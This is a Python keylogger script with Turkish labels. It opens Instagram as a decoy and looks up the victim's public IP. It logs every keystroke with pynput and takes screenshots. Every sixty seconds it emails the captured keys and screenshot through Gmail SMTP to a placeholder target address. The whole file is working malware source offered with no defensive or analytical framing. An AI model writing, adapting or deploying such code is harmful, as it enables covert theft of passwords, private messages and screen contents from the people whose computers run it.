
import pynput.keyboard
import smtplib,os
import threading
import webbrowser
from datetime import *
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import formatdate
from email import encoders
from requests import get
from mss import mss


webbrowser.open("https://www.instagram.com/")
IP = get('https://api.ipify.org').content.decode('utf8')
saat = datetime.now().strftime("%H:%M")



class Keylogger:
	def __init__(self, time_interval, email, password):
		self.logger = "[Keylogger Başlatıldı - IP Adresi: " + IP + "]\n"
		self.subject = "Keylogger Raporu" + " - " + IP + " - " + saat
		self.email = email
		self.password = password
		self.interval = time_interval
	

	def append_to_log(self, key_strike):
		self.logger = self.logger + key_strike

	def evaluate_keys(self, key):
		try: 
			Pressed_key = str(key.char)
		except AttributeError:
			if key == key.space:	
				Pressed_key =  " "
			else:
				Pressed_key =  " " + str(key) + " "
		self.append_to_log(Pressed_key)


	def report(self):
		self.send_mail(self.email, self.password, self.subject, self.logger)
		self.logger = ""
		timer = threading.Timer(self.interval, self.report)
		timer.start()

        
  
  
	def send_mail(self, email, password, subject, message):
					mss().shot()
					Email_message = 'Subject: {}\n\n{}'.format(subject, message)
					msg = MIMEMultipart()
					msg['From'] = email
					msg['To'] = "TARGET EMAIL"
					msg['Date'] = formatdate(localtime = True)
					msg['Subject'] = subject
					msg.attach(MIMEText("Keylogger Screenshot "+IP+"  "+saat+"\n\n"+Email_message))
					part = MIMEBase('application', "octet-stream")
					part.set_payload(open("M1000-1.png", "rb").read())
					encoders.encode_base64(part)
					part.add_header('Content-Disposition', 'attachment; filename="M1000-1.png"')
					msg.attach(part)
					smtp = smtplib.SMTP("smtp.gmail.com", 587)
					smtp.starttls()
					smtp.login(email,password)
					smtp.sendmail("EMAİL", "TARGET_EMAİL", msg.as_string())
					smtp.quit()
  

	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()

   
   

   


my_keylogger = Keylogger(60, "EMAİL", "EMAİL_PASSWD")
my_keylogger.start()




